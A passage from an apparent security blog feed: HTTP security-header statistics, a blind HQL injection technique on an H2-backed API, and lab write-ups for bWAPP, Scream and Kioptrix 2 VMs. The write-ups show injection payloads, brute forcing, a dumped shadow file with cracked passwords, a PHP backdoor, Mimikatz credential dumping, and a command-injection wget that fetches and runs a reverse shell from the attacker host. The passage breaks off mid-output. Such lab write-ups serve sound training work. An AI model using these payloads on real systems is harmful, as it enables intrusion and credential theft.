        var data = google.visualization.arrayToDataTable([
          ['Value', 'Occurence'],  
          ['Only max-age', 68],
          ['max-age and includeSubDomains', 29]
        ]);

        var options = {
          title: 'Strict-Transport-Security Statistics'
        };

        var chart = new google.visualization.PieChart(document.getElementById('strict-transport-security-stats'));
        chart.draw(data, options);

        // max-age statistics
        var data = google.visualization.arrayToDataTable([
          ['Value', 'Occurence'],  
          ['1', 1],
          ['600', 1],
          ['3600', 1],
          ['14400', 1],
          ['86400', 1],
          ['86400', 1],
          ['864000', 1],
          ['1728000', 1],
          ['2592000', 1],
          ['2592000', 1],
          ['3000000', 1],
          ['5184000', 1],
          ['7776000', 1],
          ['8640000', 1],
          ['10886400', 1],
          ['15552000', 1],
          ['15768000', 1],
          ['15768000', 1],
          ['16070400', 1],
          ['31556926', 1],
          ['31557600', 1],
          ['47336400', 1],
          ['63072000', 1],
          ['86400000', 1],
          ['631152000', 1],
          ['31556926', 2],
          ['63072000', 2],
          ['631138519', 2],
          ['15768000', 4],
          ['604800', 5],
          ['10893354', 7],
          ['0', 8],
          ['31536000', 8],
          ['31536000', 32]
        ]);

        var options = {
          title: 'Max-age Statistics'
        };

        var chart = new google.visualization.PieChart(document.getElementById('max-age-stats'));
        chart.draw(data, options);

      }
</script>


<p><strong>EDIT</strong>: Added statistics of <em>max-age</em> option.</p>

<p>Hi there,</p>

<p>This blog post deals with HTTP Security Headers on top 10k Alexa websites.
Based on <a href="https://www.reddit.com/r/netsec/comments/254om6/how_common_are_http_security_headers_really_lzone/">this</a>  discussion on <a href="https://www.reddit.com/r/netsec/">netsec</a>, I decided to do some statistics on Alexa ranking.</p>

<p>To do this study, I did a GET HTTP Request and saved the headers in the HTTP response. This has been done using Python.</p>

<p>First of all, I scanned 10000 hosts. 555 hosts didn&rsquo;t respond so those statistics are based on <strong>9445</strong> hosts.</p>

<p>Then, I checked the presence of HTTP security Headers.
OWASP provides a good resource <a href="https://www.owasp.org/index.php/List_of_useful_HTTP_headers">here</a> where they define HTTP Security Headers.</p>

<p>Basically, I checked the presence of those ones:</p>

<ul>
<li>X-Frame-Options</li>
<li>X-XSS-Protection</li>
<li>X-Content-Type-Options</li>
<li>Strict-Transport-Security</li>
<li>Content-Security-Policy</li>
<li>Content-Security-Policy-Report-Only</li>
</ul>


<p>Here are the results:</p>

<div id="hosts-up" style="width: 900px; height: 500px;"></div>


<p>Then, I decided to realize statistics on the different values for some of the most used HTTP header.</p>

<h3>X-Frame-Options</h3>

<div id="x-frame-options-stats" style="width: 900px; height: 500px;"></div>


<h3>X-XSS-Protection</h3>

<div id="x-xss-protection-stats" style="width: 900px; height: 500px;"></div>


<h3>Strict-Transport-Security</h3>

<div id="strict-transport-security-stats" style="width: 900px; height: 500px;"></div>


<h4>Max-age statistics</h4>

<div id="max-age-stats" style="width: 900px; height: 500px;"></div>


<h3>X-Content-Type-Options</h3>

<p>This header doesn&rsquo;t allow options so the only value is <code>NOSNIFF</code>.
All <strong>202</strong> hosts had this value.</p>

<p>Hope you liked it and that it gave you updated information about the (bad, unfortunately) usage of Security headers.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SecOS-1: First VM out]]></title>
    <link href="http://paulsec.github.io/blog/2014/05/12/secos-1-first-vm-out/"/>
    <updated>2014-05-12T17:54:04+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/05/12/secos-1-first-vm-out</id>
    <content type="html"><![CDATA[<p>Hey there,</p>

<p>Quick blog post for the first VM I created to experiment some of your pentesting skills.</p>

<p>The idea grew up when I developed some security tools (especially the one (<a href="https://github.com/PaulSec/CSRFT">CSRFT</a>) I presented at BSides London few weeks ago) to create a legal environment where you could try it out.</p>

<p>I really liked creating this Boot2root VM.
So, I&rsquo;ll create few more that will rely on each other so keep the flags because you&rsquo;ll need it for the next ones.</p>

<p>You can find the VM on <a href="http://vulnhub.com/">VulnHub</a> and I hope you&rsquo;ll have some fun in solving it.</p>

<p>To conclude, I&rsquo;d like to thank <a href="https://twitter.com/g0tmi1k">g0tmi1k</a> for his feedbacks, ideas, and also <a href="https://twitter.com/barrebas">Bas</a> to beta-test the VM. Thanks!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Blind HQL Injection in REST API using H2 dbms]]></title>
    <link href="http://paulsec.github.io/blog/2014/05/05/blind-hql-injection-in-rest-api-using-h2-dbms/"/>
    <updated>2014-05-05T22:39:22+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/05/05/blind-hql-injection-in-rest-api-using-h2-dbms</id>
    <content type="html"><![CDATA[<p>This post deals with some research I just did regarding (Blind) HQL injections with H2 as the DataBase Management System.</p>

<p>First, you should read this post which gives some really useful information regarding HQL injections in general: <a href="http://blog.h3xstream.com/2014/02/hql-for-pentesters.html">HQL for pentesters</a>.</p>

<p>During the assessment, I checked the API calls by using Burp as a proxy and one call was:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://application/API/Users/?req=id=1</span></code></pre></td></tr></table></div></figure>


<p>The output was a JSON response, such as:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[{user: "admin", id: "1", firstName:"Admin"}]</span></code></pre></td></tr></table></div></figure>


<p>If you changed the id with the numeric value <strong>2</strong>, and so on.. it was working.</p>

<p>On the back-end system, the request should have been something like :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>select * from users where id = '&lt;id&gt;'</span></code></pre></td></tr></table></div></figure>


<p>By inserting a single-quote character, I raised an exception and I got the SQL statement.
Nice, because it was the same one as below.</p>

<p>Some special characters/words were banned such as &lsquo;=&rsquo;, etc. But there was still the operator &lsquo;LIKE&rsquo; remaining.
Then, I started to insert conditions to see how the system was reacting such as:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://application/API/Users/?req=id=1' AND '1' LIKE '1</span></code></pre></td></tr></table></div></figure>


<p>The output was the same:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[{user: "admin", id: "1", firstName:"Admin"}]</span></code></pre></td></tr></table></div></figure>


<p>However, when the condition was false, such as:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://application/API/Users/?req=id=1' AND '1' LIKE '2</span></code></pre></td></tr></table></div></figure>


<p>The JSON response was empty.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[]</span></code></pre></td></tr></table></div></figure>


<p>So, if the condition is false the output is empty.</p>

<p>(Blind) HQL injections are similar to (Blind) SQL injections but due to HQL syntax, this is really limited.
Moreover, exploitation techniques depends on the dbms system behind.
For this example, <a href="http://www.h2database.com/html/functions.html">H2 Database website</a> is the reference where you can find out what you&rsquo;re allowed to do.</p>

<p>Basically, what you&rsquo;ll be able to do is:</p>

<ul>
<li>Enumerate tables, columns by bruteforcing it</li>
<li>And use built-in functions</li>
</ul>


<p>I listed here some (useful) built-in functions that you can use:</p>

<ul>
<li><strong>user()</strong>: returns the user which is used</li>
<li><strong>database_path()</strong>: returns the path of the database on the filesystem</li>
<li><strong>FILE_READ(FILE, NULL)</strong>: read FILE on the filesystem. (hint: /etc/passwd)</li>
</ul>


<p>Quick example, I managed to retrieve the current <code>user()</code> this way:</p>

<p><em>First</em>, let&rsquo;s get the length of the user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://application/API/Users/?req=id=1' AND length(user()) LIKE '2</span></code></pre></td></tr></table></div></figure>


<p><em>Then</em>, we can use <code>substring()</code> to iterate on each characters using <code>LIKE</code> operator.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://application/API/Users/?req=id=1' AND substring(user(), 1,1) LIKE 'S</span></code></pre></td></tr></table></div></figure>


<p>As you know, process to extract those information is quite long. I will update my <a href="https://github.com/PaulSec/HQLmap">HQLmap Project</a> to automate the process in the next few days. (So far, it supports HQL Injections)</p>

<p>I hope it might have helped you during your assessment and feel free to contact me if you have other techniques for h2 database, I&rsquo;ll update this blog post.</p>

<p>Cheers,</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSides Slides - CSRFT]]></title>
    <link href="http://paulsec.github.io/blog/2014/04/29/bsides-slides-csrft/"/>
    <updated>2014-04-29T20:09:17+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/04/29/bsides-slides-csrft</id>
    <content type="html"><![CDATA[<p>Hey,</p>

<p>Just a quick post to give you the link to my slides for BSides London today: <a href="http://paulsec.github.io/bsides-london-2014/">Here</a>
Don&rsquo;t hesitate if you have any feedback, or any good feature.</p>

<p>You can reach me either on <a href="https://github.com/PaulSec">Github</a> and <a href="https://twitter.com/PaulWebSec">Twitter</a></p>

<p>Just few words about the conference which was absolutely amazing.
Some really great people were here, good atmosphere and people were really helpful.</p>

<p>For sure, I&rsquo;ll attend it next year.</p>

<p>Cheers,</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[bWAPP: Write-up]]></title>
    <link href="http://paulsec.github.io/blog/2014/04/21/bwapp-write-up/"/>
    <updated>2014-04-21T14:29:34+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/04/21/bwapp-write-up</id>
    <content type="html"><![CDATA[<p><strong>This post contains the steps to get a root shell with bWapp VM</strong></p>

<h3><strong>Host discovery</strong></h3>

<p>As always, we need to discover where the machine is on our network.
To do so, let&rsquo;s use Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sP 192.168.1.1/24 </span></code></pre></td></tr></table></div></figure>


<h3><strong>Fingerprinting</strong></h3>

<p>After getting the IP address (<em>192.168.1.10</em>), we need to do some fingerprinting.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV 192.168.1.10</span></code></pre></td></tr></table></div></figure>


<p><img src="http://paulsec.github.io/images/bWAPP/nmap-result.png" width="75%" height="75%"/></p>

<p><em>Fig. Nmap scan result</em></p>

<p>A lot of services were open, such as: VNC, FTP, etc.</p>

<p>As I saw it in the scan report, I decided to scan the port 80 with <strong>Nikto</strong>.</p>

<p><img src="http://paulsec.github.io/images/bWAPP/nikto.png" width="75%" height="75%"/></p>

<p><em>Fig. Nikto report on ports 80 (HTTP)</em></p>

<p>Moreover, I decided to launch <em>DirBuster</em> to retrieve folders/documents.</p>

<p><img src="http://paulsec.github.io/images/bWAPP/dirbuster.png" width="75%" height="75%"/></p>

<p><em>Fig. Launching DirBuster on port 80</em></p>

<p>To conclude, I checked the FTP (ProFTPD 1.3) and I was able to connect as an <strong>anonymous</strong> user.
We only had access to a folder full of PDF documents.</p>

<p><img src="http://paulsec.github.io/images/bWAPP/ftp-access-anonymous.png" width="75%" height="75%"/></p>

<p><em>Fig. Anonymous access on FTP Server</em></p>

<p>Thanks to DirBuster result, I saw that the <em>/webdav/</em> folder (accessible through HTTP) was linked to the folder we were connected through the FTP session.</p>

<p>Let&rsquo;s talk now about the exploitation</p>

<h3><strong>Exploitation</strong></h3>

<h3><strong>Exploiting VNC</strong></h3>

<p>I started by exploiting VNC Service using <strong>Hydra</strong> to crack the password :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>hydra -p <span class="s2">&quot;password&quot;</span> 192.168.1.10 vnc
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://paulsec.github.io/images/bWAPP/hydra-crack.png" width="75%" height="75%"/></p>

<p><em>Fig. Checking that VNC uses default password</em></p>

<p>The output was clear: the password was the default one.
We were able connect using <em>vncviewer</em> and we were &hellip; <strong>r00t</strong>.</p>

<p><img src="http://paulsec.github.io/images/bWAPP/vnc.png" width="50%" height="50%"/></p>

<p><em>Fig. Root access through VNC</em></p>

<p>Then, I extracted the /etc/shadow :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root:<span class="nv">$1$6</span>.aigTP1<span class="nv">$FC1TuoITEYSQwRV0hi6gj</span>/:15792:0:99999:7:::
</span><span class='line'>daemon:*:13991:0:99999:7:::
</span><span class='line'>bin:*:13991:0:99999:7:::
</span><span class='line'>sys:*:13991:0:99999:7:::
</span><span class='line'>sync:*:13991:0:99999:7:::
</span><span class='line'>games:*:13991:0:99999:7:::
</span><span class='line'>man:*:13991:0:99999:7:::
</span><span class='line'>lp:*:13991:0:99999:7:::
</span><span class='line'>mail:*:13991:0:99999:7:::
</span><span class='line'>news:*:13991:0:99999:7:::
</span><span class='line'>uucp:*:13991:0:99999:7:::
</span><span class='line'>proxy:*:13991:0:99999:7:::
</span><span class='line'>www-data:*:13991:0:99999:7:::
</span><span class='line'>backup:*:13991:0:99999:7:::
</span><span class='line'>list:*:13991:0:99999:7:::
</span><span class='line'>irc:*:13991:0:99999:7:::
</span><span class='line'>gnats:*:13991:0:99999:7:::
</span><span class='line'>nobody:*:13991:0:99999:7:::
</span><span class='line'>libuuid:!:13991:0:99999:7:::
</span><span class='line'>dhcp:*:13991:0:99999:7:::
</span><span class='line'>syslog:*:13991:0:99999:7:::
</span><span class='line'>klog:*:13991:0:99999:7:::
</span><span class='line'>hplip:*:13991:0:99999:7:::
</span><span class='line'>avahi-autoipd:*:13991:0:99999:7:::
</span><span class='line'>gdm:*:13991:0:99999:7:::
</span><span class='line'>pulse:*:13991:0:99999:7:::
</span><span class='line'>messagebus:*:13991:0:99999:7:::
</span><span class='line'>avahi:*:13991:0:99999:7:::
</span><span class='line'>polkituser:*:13991:0:99999:7:::
</span><span class='line'>haldaemon:*:13991:0:99999:7:::
</span><span class='line'>bee:<span class="nv">$1$tJB0ndAJ$0d42BkRQ7vebj</span>/bE5RdQH1:15792:0:99999:7:::
</span><span class='line'>mysql:!:15792:0:99999:7:::
</span><span class='line'>sshd:*:15792:0:99999:7:::
</span><span class='line'>dovecot:*:15792:0:99999:7:::
</span><span class='line'>smmta:*:15792:0:99999:7:::
</span><span class='line'>smmsp:*:15792:0:99999:7:::
</span><span class='line'>neo:<span class="nv">$1$fSorv0ad$56lfF9qd8o4caaSB6dVqi</span>/:15897:0:99999:7:::
</span><span class='line'>alice:<span class="nv">$1$yRUOVrYB$9f4TMaym</span>/xOSeGbmsgFGI/:15897:0:99999:7:::
</span><span class='line'>thor:<span class="nv">$1$Iy6Mvuaz$FzcNXTQ668kDD5LY</span>.ObdL/:15897:0:99999:7:::
</span><span class='line'>wolverine:<span class="nv">$1$PUGlrXi8$oXOwDBaAzxtgXh10Xkw9i</span>/:15897:0:99999:7:::
</span><span class='line'>johnny:<span class="nv">$1$uqzKnduQ$MPxhWXcf2FFQarhO95d5y</span>/:15897:0:99999:7:::
</span><span class='line'>selene:<span class="nv">$1$BHZLob3h$mru35IhZzRdnfTHOADrkJ0</span>:15897:0:99999:7:::
</span><span class='line'>postfix:*:15901:0:99999:7:::
</span><span class='line'>proftpd:!:16051:0:99999:7:::
</span><span class='line'>ftp:*:16051:0:99999:7:::
</span><span class='line'>snmp:*:16178:0:99999:7:::
</span><span class='line'>ntp:*:16178:0:99999:7:::
</span></code></pre></td></tr></table></div></figure>


<p>I decided to crack it using <em>John the Ripper</em> and I cracked 4 hashes (using <em>d4rkc0de.lst</em>):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Asgard           <span class="o">(</span>thor<span class="o">)</span>
</span><span class='line'>bug              <span class="o">(</span>bee<span class="o">)</span>
</span><span class='line'>bug              <span class="o">(</span>root<span class="o">)</span>
</span><span class='line'>m00n             <span class="o">(</span>selene<span class="o">)</span>
</span><span class='line'>trinity          <span class="o">(</span>neo<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>We could log in in root and had entire access on the server.</p>

<h3><strong>Exploiting Webdav</strong></h3>

<p>As we saw: we have FTP access in a folder accessible through HTTP.
Then, we can upload a (PHP) Backdoor.</p>

<p><img src="http://paulsec.github.io/images/bWAPP/webdav-activated.png" width="75%" height="75%"/></p>

<p><em>Fig. Checking that Webdav was activated</em></p>

<p><img src="http://paulsec.github.io/images/bWAPP/ftp-upload-backdoor.png" width="50%" height="50%"/></p>

<p><em>Fig. Uploading our backdoor on the Server</em></p>

<p>Then, the backdoor is accessible in the folder <code>/webdav</code></p>

<p>Let&rsquo;s access it and we&rsquo;ll have access on the server (but limited shell) so this was not really interested compared to the other vulns.</p>

<p><img src="http://paulsec.github.io/images/bWAPP/webdav-backdoor.png" width="75%" height="75%"/></p>

<p><em>Fig. Executing commands with our Backdoor</em></p>

<h3><strong>Exploiting Heartbleed</strong></h3>

<p>Everybody heard about Heartbleed and bWAPP integrates a vulnerable version of OpenSSL.
You can then practice it and try all the scripts that have been released on the internet.</p>

<p><img src="http://paulsec.github.io/images/bWAPP/heartbleed-config.png" width="75%" height="75%"/></p>

<p><em>Fig. Configuring Heartbleed on port 8443</em></p>

<p><img src="http://paulsec.github.io/images/bWAPP/heartbleed-exploit.png" width="75%" height="75%"/></p>

<p><em>Fig. Exploiting Heartbleed attack</em></p>

<p>For this experiment, I wanted to have fun with the Metasploit&rsquo;s one but try the one you prefer.
Moreover, you can give it a try to steal private keys :&ndash;).</p>

<h3><strong>Exploiting SNMP</strong></h3>

<p>The last step was to exploit SNMP service.
First, I bruteforce the login and we found two (default) logins :</p>

<p><img src="http://paulsec.github.io/images/bWAPP/snmp-login.png" width="75%" height="75%"/></p>

<p><em>Fig. Bruteforcing SNMP Logins</em></p>

<p>Then, we exploited the service to gather lot of information such as the Computer Name, the processes running on the system etc.
And this is basically due to a (default and not secure) installation of SNMP Service.</p>

<p><img src="http://paulsec.github.io/images/bWAPP/snmp-exploit.png" width="75%" height="75%"/></p>

<p><em>Fig. Exploiting SNMP Service</em></p>

<h3><strong>Thoughts</strong></h3>

<p>I just checked for few hours the VM and it contains a lot of (interesting) exercices to practice with.
I exploited some of the flaws but there are even more so this write-up is not exhaustive.</p>

<p>Feel free to exploit this VM the way you prefer :&ndash;)
Cheers,</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Scream: Write-up]]></title>
    <link href="http://paulsec.github.io/blog/2014/04/16/scream-write-up/"/>
    <updated>2014-04-16T21:17:28+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/04/16/scream-write-up</id>
    <content type="html"><![CDATA[<p><strong>This post contains the steps to get a root shell with Scream VM</strong></p>

<p>This VM can he found <a href="http://vulnhub.com/entry/devrandom_scream,47/">here</a>. Have a look to find even more VMs.
But before starting the report, I&rsquo;d like to congratulate g0tmi1k for his <em>awesome</em> tool : <a href="https://github.com/g0tmi1k/VulnInjector">VulnInjector</a>.</p>

<p>Ok, let&rsquo;s do this write-up !</p>

<h3><strong>Host discovery</strong></h3>

<p>As always, we need to discover where the machine is on our network.
To do so, let&rsquo;s use Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sP 192.168.1.1/24 </span></code></pre></td></tr></table></div></figure>


<h3><strong>Fingerprinting</strong></h3>

<p>After getting the IP address (<em>192.168.1.2</em>), we need to do some fingerprinting.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV 192.168.1.2</span></code></pre></td></tr></table></div></figure>


<p><img src="http://paulsec.github.io/images/scream/nmap-result.png" width="75%" height="75%"/></p>

<p><em>Fig. Nmap scan result</em></p>

<p>As I saw it in the scan report, I decided to scan the port 80 with <strong>Nikto</strong>.</p>

<p><img src="http://paulsec.github.io/images/scream/nikto-result.png" width="75%" height="75%"/></p>

<p><em>Fig. Nikto report on ports 80 (HTTP)</em></p>

<p>There was no interesting file or any &lsquo;obvious&rsquo; vulnerability.</p>

<p>Then, I started to check the FTP server because the Banner was &ldquo;War-ftpd&rdquo;.
I logged in with the <em>anonymous</em> user but after a while, I got blacklisted..</p>

<p>I guess the FTP server didn&rsquo;t appreciate my attempts to exploit War-ftpd flaws, while trying to crack the <strong>ftp</strong> account with Hydra.</p>

<p>And, I got banned.</p>

<p><img src="http://paulsec.github.io/images/scream/ftp-timed-out.png" width="50%" height="50%"/></p>

<p><em>Fig. Time out of the FTP connection after getting blacklisted</em></p>

<p>Then, the lat attempt was with the SSH Server with the curious Banner &ldquo;WeOnlyDo sshd 2.1.3&rdquo;..
Mh.. This <em>custom</em> banner was interesting.</p>

<p>I decided to go further with the SSH service.</p>

<h3><strong>Exploitation</strong></h3>

<p>I started browsing on the internet to find some <em>sshd</em> vulnerabilities on <em>Windows</em> platform.
Then, I found : <a href="http://www.exploit-db.com/exploits/24133/">Freesshd Authentication Bypass</a> Metasploit module.</p>

<p><img src="http://paulsec.github.io/images/scream/search-freesshd.png" width="75%" height="75%"/></p>

<p><em>Fig. Looking for a Freesshd exploit</em></p>

<p>I decided to check it out.
I knew there was an account called <em>ftp</em> but this didn&rsquo;t work.</p>

<p><img src="http://paulsec.github.io/images/scream/freesshd-payload.png" width="75%" height="75%"/></p>

<p><em>Fig. Setting the payload for the Freesshd exploit</em></p>

<p>So, I decided to bruteforce the logins using the file provided by Metasploit.</p>

<p>And.. <strong>It worked !</strong></p>

<p><img src="http://paulsec.github.io/images/scream/freesshd-exploit.png" width="75%" height="75%"/></p>

<p><em>Fig. Successful exploitation with Freesshd exploit</em></p>

<p>Thanks to this vulnerability, I got a meterpreter session with SYSTEM privileges. Awesome !</p>

<h3><strong>Access Maintenance</strong></h3>

<p>We had a SYSTEM session but I was curious and I wanted to practice with <a href="http://blog.gentilkiwi.com/">Mimikatz</a>.
A (security) tool developed by a french guy who did some awesome work.
In few words, it allows you to dump passwords with are stored in the memory.</p>

<p>Combined with our meterpreter, we&rsquo;ve been able to load mimikatz and get the password: <em>thisisaverylongpassword</em>. And yes, it is.</p>

<p><img src="http://paulsec.github.io/images/scream/mimikatz-exploitation.png" width="60%" height="60%"/></p>

<p><em>Fig. Dumping passwords using Mimikatz</em></p>

<p>First Windows VM I&rsquo;ve tried here and it was a great surprise. I learnt few tricks and that was nice.<br/>
Hope you liked it and good evening !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix 2: Write-up]]></title>
    <link href="http://paulsec.github.io/blog/2014/04/15/kioptrix-2-write-up/"/>
    <updated>2014-04-15T22:51:56+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/04/15/kioptrix-2-write-up</id>
    <content type="html"><![CDATA[<p><strong>This post contains the steps to get a root shell with Kioptrix level 2 VM</strong></p>

<p>This VM can he found <a href="http://vulnhub.com/entry/kioptrix-level-11-2,23/">here</a>. Have a look to find even more VMs</p>

<h3><strong>Host discovery</strong></h3>

<p>First, we need to discover where the machine is on our network.
To do so, let&rsquo;s use Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sP 192.168.1.1/24 </span></code></pre></td></tr></table></div></figure>


<h3><strong>Fingerprinting</strong></h3>

<p>After getting the IP address, we need to do some fingerprinting.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV 192.168.1.42</span></code></pre></td></tr></table></div></figure>


<p><img src="http://paulsec.github.io/images/kioptrix/2/nmap-result.png" width="75%" height="75%"/></p>

<p><em>Fig. Nmap scan result</em></p>

<p>As I saw it in the scan report, I decided to scan the port 80 with <strong>Nikto</strong>.</p>

<p><img src="http://paulsec.github.io/images/kioptrix/2/nikto-result.png" width="75%" height="75%"/></p>

<p><em>Fig. Nikto report on ports 80 (HTTP)</em></p>

<p>There was no interesting file or any &lsquo;obvious&rsquo; vulnerability.
So, I decided to check the Web application.</p>

<h3><strong>Exploitation</strong></h3>

<p>When you arrive on the Index page, you have a login page.
No Stylesheet file, etc. So I decided to check if the login form was vulnerable to SQL injection..</p>

<p><img src="http://paulsec.github.io/images/kioptrix/2/login-sqli.png" width="40%" height="40%"/></p>

<p><em>Fig. Testing SQL Injection in Login form</em></p>

<p><strong>Bingo, it was ! </strong></p>

<p>Thanks to this flaw, we had access to a &ldquo;admin panel&rdquo; to launch <em>ping</em> commands.
Seems there might be a Command Execution vulnerability.</p>

<p>I tried using payload like : <code>; ls</code></p>

<p>And guess what ? It worked !</p>

<p>Then, let&rsquo;s get the <code>/etc/passwd</code> file.</p>

<p><img src="http://paulsec.github.io/images/kioptrix/2/command-exec-etc-passwd-cmd.png" width="75%" height="75%"/></p>

<p><em>Fig. Command injected to display /etc/passwd</em></p>

<p>And the result :</p>

<p><img src="http://paulsec.github.io/images/kioptrix/2/command-exec-etc-passwd.png" width="75%" height="75%"/></p>

<p><em>Fig. Output when using the Command exec to display /etc/passwd</em></p>

<p>After this, we were able to launch commands on the system but the shell was under apache&rsquo;s user. No privilege..</p>

<h3><strong>Privilege Escalation</strong></h3>

<p>The final step was to find a local root exploit that we could use.</p>

<p>By typing <code>uname -a</code> command, I found a corresponding exploit : <a href="http://www.exploit-db.com/exploits/9542/">Linux Kernel 2.6 &lt; 2.6.19 &ndash; (32bit) ip_append_data() ring0 Root Exploit</a></p>

<p>However, we didn&rsquo;t have write access in the current folder, so let&rsquo;s download it in <code>/tmp</code>.</p>

<p>Moreover, a fun trick would be to get a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP Reverse Shell</a>.
Download it, change the configuration, send it using Netcat / wget like this :</p>

<p>On your host machine :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat php-reverse-shell.php | nc -l 8080</span></code></pre></td></tr></table></div></figure>


<p>And using the command execution vulnerability, download the file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>; wget 192.168.1.1:8080 -O /tmp/shell.php</span></code></pre></td></tr></table></div></figure>


<p>And launch the shell :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>; php /tmp/shell.php</span></code></pre></td></tr></table></div></figure>


<p>And you got a reverse shell (:&ndash;)) on your machine :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
</span><span class='line'> 12:59:24 up  3:51,  0 users,  load average: 0.07, 0.09, 0.03
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache)
</span><span class='line'>sh: no job control in this shell
